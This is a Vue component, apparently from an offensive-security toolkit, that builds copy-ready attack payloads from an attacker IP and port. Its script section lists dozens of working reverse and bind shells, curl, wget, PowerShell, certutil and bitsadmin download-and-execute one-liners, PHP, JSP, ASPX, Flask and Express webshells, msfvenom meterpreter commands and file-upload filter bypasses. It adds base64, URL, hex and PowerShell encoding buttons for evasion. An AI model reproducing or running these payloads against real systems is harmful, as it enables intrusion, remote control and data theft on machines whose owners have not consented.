<script setup lang="ts">
import { computed, ref } from "vue";

interface PayloadTemplate {
  category: "reverse-shell" | "bind-shell" | "webshell" | "msfvenom" | "file-upload" | "oneliner";
  name: string;
  lang: string;
  template: string;
  note?: string;
}

const lhost = ref("10.10.14.1");
const lport = ref("4444");
const cmd = ref("id");
const query = ref("");
const activeCategory = ref<PayloadTemplate["category"] | "all">("all");

const templates: PayloadTemplate[] = [
  // ------------------- REVERSE SHELLS -------------------
  { category: "reverse-shell", name: "bash /dev/tcp", lang: "bash", template: `bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'` },
  { category: "reverse-shell", name: "bash 196", lang: "bash", template: `0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196` },
  { category: "reverse-shell", name: "sh", lang: "sh", template: `/bin/sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1` },
  { category: "reverse-shell", name: "nc traditional", lang: "nc", template: `nc -e /bin/sh {LHOST} {LPORT}` },
  { category: "reverse-shell", name: "nc mkfifo", lang: "nc", template: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f` },
  { category: "reverse-shell", name: "ncat with ssl", lang: "ncat", template: `ncat --ssl {LHOST} {LPORT} -e /bin/bash` },
  { category: "reverse-shell", name: "python3 short", lang: "python", template: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` },
  { category: "reverse-shell", name: "python classic", lang: "python", template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
  { category: "reverse-shell", name: "perl", lang: "perl", template: `perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
  { category: "reverse-shell", name: "ruby", lang: "ruby", template: `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{LHOST}",{LPORT}))'` },
  { category: "reverse-shell", name: "php exec", lang: "php", template: `php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'` },
  { category: "reverse-shell", name: "nodejs", lang: "node", template: `require('child_process').exec('bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1');` },
  { category: "reverse-shell", name: "powershell TCP", lang: "powershell", template: `$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
  { category: "reverse-shell", name: "powershell -c (one-liner)", lang: "powershell", template: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$s=$c.GetStream();...` },
  { category: "reverse-shell", name: "awk", lang: "awk", template: `awk 'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` },
  { category: "reverse-shell", name: "golang", lang: "go", template: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{LHOST}:{LPORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go` },
  { category: "reverse-shell", name: "socat tty", lang: "socat", template: `socat TCP:{LHOST}:{LPORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane` },
  { category: "reverse-shell", name: "lua", lang: "lua", template: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');while true do local s,status,partial=t:receive();f=assert(io.popen(s,'r'));o=f:read('*a');t:send(o);end"` },

  // ------------------- BIND SHELLS -------------------
  { category: "bind-shell", name: "nc bind", lang: "nc", template: `nc -lvnp {LPORT} -e /bin/bash` },
  { category: "bind-shell", name: "python bind", lang: "python", template: `python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{LPORT}));s.listen(1);c,a=s.accept();subprocess.call(["/bin/sh","-i"],stdin=c.fileno(),stdout=c.fileno(),stderr=c.fileno())'` },
  { category: "bind-shell", name: "socat bind", lang: "socat", template: `socat TCP-LISTEN:{LPORT},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane` },

  // ------------------- LISTENERS -------------------
  { category: "oneliner", name: "netcat listener", lang: "nc", template: `nc -lvnp {LPORT}`, note: "run on attacker to catch reverse shell" },
  { category: "oneliner", name: "socat listener (tty)", lang: "socat", template: `socat file:\`tty\`,raw,echo=0 TCP-L:{LPORT}`, note: "fully interactive tty on attacker" },
  { category: "oneliner", name: "rlwrap nc", lang: "nc", template: `rlwrap nc -lvnp {LPORT}`, note: "with history + arrow keys" },
  { category: "oneliner", name: "python http server", lang: "python", template: `python3 -m http.server {LPORT}`, note: "host payloads for curl/wget target" },
  { category: "oneliner", name: "smb server (impacket)", lang: "python", template: `impacket-smbserver share . -smb2support -username user -password pass`, note: "SMB share for windows target" },

  // ------------------- TARGET COMMANDS -------------------
  { category: "oneliner", name: "curl download + exec", lang: "bash", template: `curl http://{LHOST}:{LPORT}/sh.sh | bash` },
  { category: "oneliner", name: "wget download + exec", lang: "bash", template: `wget -qO- http://{LHOST}:{LPORT}/sh.sh | sh` },
  { category: "oneliner", name: "powershell download + exec", lang: "powershell", template: `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}:{LPORT}/p.ps1')"` },
  { category: "oneliner", name: "certutil download (win)", lang: "windows", template: `certutil.exe -urlcache -split -f "http://{LHOST}:{LPORT}/nc.exe" nc.exe` },
  { category: "oneliner", name: "bitsadmin download (win)", lang: "windows", template: `bitsadmin /transfer n http://{LHOST}:{LPORT}/nc.exe %APPDATA%\\nc.exe` },

  // ------------------- PTY UPGRADE -------------------
  { category: "oneliner", name: "python pty spawn", lang: "python", template: `python -c 'import pty;pty.spawn("/bin/bash")'`, note: "after catching shell: upgrade to pty" },
  { category: "oneliner", name: "script pty", lang: "bash", template: `script /dev/null -c bash`, note: "alternative pty upgrade" },
  { category: "oneliner", name: "stty raw", lang: "bash", template: `stty raw -echo; fg`, note: "on attacker after Ctrl+Z to get raw tty" },

  // ------------------- WEBSHELLS -------------------
  { category: "webshell", name: "PHP one-liner", lang: "php", template: `<?php system($_GET['c']); ?>`, note: "simplest php webshell — ?c=id" },
  { category: "webshell", name: "PHP obfuscated", lang: "php", template: `<?php $f="s"."y"."s"."t"."e"."m";$f($_REQUEST["c"]); ?>` },
  { category: "webshell", name: "PHP file upload", lang: "php", template: `<?php if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);}?><form method=post enctype=multipart/form-data><input name=f type=file><input type=submit></form>` },
  { category: "webshell", name: "JSP shell", lang: "jsp", template: `<% Runtime.getRuntime().exec(request.getParameter("c")); %>` },
  { category: "webshell", name: "ASPX shell", lang: "aspx", template: `<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process.Start("cmd.exe","/c "+Request["c"]); %>` },
  { category: "webshell", name: "Python flask shell", lang: "python", template: `from flask import Flask,request\nimport os\napp=Flask(__name__)\n@app.route('/')\ndef r(): return os.popen(request.args.get('c','id')).read()\napp.run(host='0.0.0.0',port={LPORT})` },
  { category: "webshell", name: "Node.js Express shell", lang: "node", template: `require('express')().get('/',(q,r)=>require('child_process').exec(q.query.c||'id',(e,o)=>r.send(o))).listen({LPORT})` },

  // ------------------- MSFVENOM -------------------
  { category: "msfvenom", name: "linux x64 meterpreter", lang: "msfvenom", template: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf` },
  { category: "msfvenom", name: "windows x64 meterpreter", lang: "msfvenom", template: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe` },
  { category: "msfvenom", name: "php meterpreter", lang: "msfvenom", template: `msfvenom -p php/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > shell.php` },
  { category: "msfvenom", name: "aspx meterpreter", lang: "msfvenom", template: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o shell.aspx` },
  { category: "msfvenom", name: "war meterpreter", lang: "msfvenom", template: `msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war` },
  { category: "msfvenom", name: "android apk", lang: "msfvenom", template: `msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} R > shell.apk` },
  { category: "msfvenom", name: "python reverse", lang: "msfvenom", template: `msfvenom -p python/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.py` },
  { category: "msfvenom", name: "shellcode C buffer", lang: "msfvenom", template: `msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f c -b "\\x00\\x0a"` },

  // ------------------- FILE UPLOAD BYPASS -------------------
  { category: "file-upload", name: "magic bytes + php", lang: "upload", template: `GIF89a\n<?php system($_GET['c']); ?>`, note: "prepend GIF89a to bypass magic byte filter" },
  { category: "file-upload", name: "double extension", lang: "upload", template: `shell.php.jpg`, note: "some apache configs execute .php.*" },
  { category: "file-upload", name: "case variation", lang: "upload", template: `shell.pHp`, note: "bypass lowercase extension check" },
  { category: "file-upload", name: "null byte (old)", lang: "upload", template: `shell.php%00.jpg`, note: "legacy PHP <5.3.4" },
  { category: "file-upload", name: "htaccess override", lang: "upload", template: `AddType application/x-httpd-php .jpg`, note: "upload .htaccess then .jpg webshell" },
];

const categories: { id: PayloadTemplate["category"] | "all"; label: string }[] = [
  { id: "all", label: "all" },
  { id: "reverse-shell", label: "reverse" },
  { id: "bind-shell", label: "bind" },
  { id: "oneliner", label: "oneliner" },
  { id: "webshell", label: "webshell" },
  { id: "msfvenom", label: "msfvenom" },
  { id: "file-upload", label: "upload" },
];

function interp(t: string): string {
  return t.replace(/\{LHOST\}/g, lhost.value).replace(/\{LPORT\}/g, lport.value).replace(/\{CMD\}/g, cmd.value);
}

function b64(t: string): string {
  return btoa(unescape(encodeURIComponent(t)));
}
function urlEnc(t: string): string { return encodeURIComponent(t); }
function hexEnc(t: string): string {
  return Array.from(new TextEncoder().encode(t)).map(b => b.toString(16).padStart(2, "0")).join("");
}
function psB64(t: string): string {
  // powershell utf-16le base64 for -EncodedCommand
  const buf = new Uint8Array(t.length * 2);
  for (let i = 0; i < t.length; i++) { buf[i * 2] = t.charCodeAt(i); }
  let bin = "";
  for (let i = 0; i < buf.length; i++) bin += String.fromCharCode(buf[i]);
  return btoa(bin);
}

const filtered = computed(() => {
  const q = query.value.toLowerCase().trim();
  return templates.filter(t => {
    if (activeCategory.value !== "all" && t.category !== activeCategory.value) return false;
    if (q) {
      const hay = (t.name + " " + t.lang + " " + t.template).toLowerCase();
      if (!hay.includes(q)) return false;
    }
    return true;
  });
});

const toast = ref("");
async function copyText(t: string) {
  try {
    await navigator.clipboard.writeText(t);
    toast.value = "copied";
    setTimeout(() => { toast.value = ""; }, 1200);
  } catch {
    toast.value = "copy failed";
    setTimeout(() => { toast.value = ""; }, 1200);
  }
}

function langColor(l: string): string {
  const m: Record<string, string> = {
    bash: "#4eaa25", sh: "#4eaa25", python: "#3572a5", perl: "#0298c3",
    ruby: "#701516", php: "#4f5d95", node: "#f1e05a", go: "#00add8",
    powershell: "#012456", nc: "#7fb3d5", ncat: "#7fb3d5", socat: "#7fb3d5",
    jsp: "#e76f00", aspx: "#178600", lua: "#000080", awk: "#c1f12e",
    msfvenom: "#ff2f4a", upload: "#d4a537", windows: "#0078d7",
  };
  return m[l] || "#6a6a6a";
}
</script>

<template>
  <div class="module">
    <div class="form">
      <div class="row params">
        <label class="mini"><span>LHOST</span><input v-model="lhost" placeholder="attacker IP" /></label>
        <label class="mini"><span>LPORT</span><input v-model="lport" placeholder="listener port" /></label>
        <label class="mini wide"><span>CMD</span><input v-model="cmd" placeholder="id (optional)" /></label>
      </div>

      <div class="row cats">
        <button
          v-for="c in categories"
          :key="c.id"
          class="cat-chip"
          :class="{ on: activeCategory === c.id }"
          @click="activeCategory = c.id"
        >{{ c.label }}</button>
      </div>

      <input v-model="query" class="search-input" placeholder="filter: bash, python, obfus, etc..." spellcheck="false" />
    </div>

    <div class="pl-list">
      <div v-if="!filtered.length" class="empty">no payloads match filter</div>
      <div v-for="(t, i) in filtered" :key="i" class="pl">
        <div class="pl-head">
          <span class="pl-name">{{ t.name }}</span>
          <span class="pl-lang" :style="{ color: langColor(t.lang), borderColor: langColor(t.lang) }">{{ t.lang }}</span>
          <span class="pl-cat">{{ t.category }}</span>
        </div>
        <pre class="pl-body">{{ interp(t.template) }}</pre>
        <div v-if="t.note" class="pl-note">» {{ t.note }}</div>
        <div class="pl-actions">
          <button class="btn-ghost tiny" @click="copyText(interp(t.template))">copy</button>
          <button class="btn-ghost tiny" @click="copyText(b64(interp(t.template)))" title="base64 encode">b64</button>
          <button class="btn-ghost tiny" @click="copyText(urlEnc(interp(t.template)))" title="URL encode">url</button>
          <button class="btn-ghost tiny" @click="copyText(hexEnc(interp(t.template)))" title="hex encode">hex</button>
          <button v-if="t.lang === 'powershell'" class="btn-ghost tiny" @click="copyText(psB64(interp(t.template)))" title="powershell -EncodedCommand">ps-b64</button>
        </div>
      </div>
    </div>

    <div v-if="toast" class="toast">{{ toast }}</div>
  </div>
</template>

<style scoped>
.params .mini.wide { flex: 1; }

.cats { flex-wrap: wrap; }
.cat-chip {
  padding: 3px 10px;
  border: 1px solid var(--border);
  background: var(--bg-panel);
  color: var(--fg-dim);
  font-size: 10px;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  cursor: pointer;
}
.cat-chip:hover { color: var(--fg); }
.cat-chip.on { color: var(--alert); border-color: var(--alert); background: rgba(255, 47, 74, 0.05); }

.search-input {
  background: var(--bg-panel);
  border: 1px solid var(--border);
  color: var(--fg);
  padding: 4px 8px;
  font-size: 12px;
  font-family: inherit;
}
.search-input:focus { border-color: var(--accent); outline: none; }

.pl-list {
  flex: 1;
  overflow-y: auto;
  display: flex;
  flex-direction: column;
  gap: 6px;
  min-height: 0;
}
.pl {
  background: var(--bg-panel);
  border: 1px solid var(--border);
  padding: 6px 8px;
  display: flex;
  flex-direction: column;
  gap: 4px;
}
.pl:hover { border-color: var(--border-hot); }
.pl-head { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
.pl-name { color: var(--fg); font-weight: 700; font-size: 12px; }
.pl-lang {
  font-size: 9px;
  padding: 0 5px;
  border: 1px solid;
  letter-spacing: 0.1em;
  text-transform: uppercase;
}
.pl-cat {
  color: var(--fg-ghost);
  font-size: 9px;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  margin-left: auto;
}
.pl-body {
  background: var(--bg);
  border: 1px solid var(--border);
  padding: 5px 8px;
  font-size: 11px;
  color: var(--valid);
  white-space: pre-wrap;
  word-break: break-all;
  max-height: 160px;
  overflow-y: auto;
  font-family: var(--mono);
  line-height: 1.4;
}
.pl-note {
  color: var(--info);
  font-size: 10px;
  font-style: italic;
}
.pl-actions { display: flex; gap: 3px; flex-wrap: wrap; }
.btn-ghost.tiny { padding: 1px 8px; font-size: 9px; }

.empty {
  color: var(--fg-ghost);
  text-align: center;
  padding: 20px;
  font-style: italic;
  font-size: 11px;
}

.toast {
  position: absolute;
  bottom: 20px;
  left: 50%;
  transform: translateX(-50%);
  padding: 4px 12px;
  background: var(--alert);
  color: #fff;
  font-size: 11px;
  letter-spacing: 0.1em;
  text-transform: uppercase;
  animation: toast 1.2s ease-out;
  pointer-events: none;
  z-index: 10;
}
@keyframes toast {
  0% { opacity: 0; transform: translate(-50%, 10px); }
  20%, 80% { opacity: 1; transform: translate(-50%, 0); }
  100% { opacity: 0; transform: translate(-50%, -10px); }
}
</style>
